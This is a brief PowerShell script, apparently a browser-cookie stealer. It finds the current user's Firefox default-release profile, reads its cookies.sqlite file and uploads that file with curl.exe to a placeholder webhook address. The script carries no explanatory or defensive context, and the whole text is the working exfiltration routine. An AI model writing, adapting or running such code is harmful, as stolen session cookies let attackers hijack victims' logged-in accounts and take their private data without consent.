$firefoxProfilePath = Join-Path -Path $env:APPDATA -ChildPath 'Mozilla\Firefox\Profiles'
$firefoxProfile = Get-ChildItem -Path $firefoxProfilePath | Where-Object {$_.Name -like "*default-release"}

$filePath = Join-Path -Path $firefoxProfile.FullName -ChildPath 'cookies.sqlite'

$webhookUrl = "URL-WEBHOOK"

curl.exe -F "file1=@$filePath" $webhookUrl

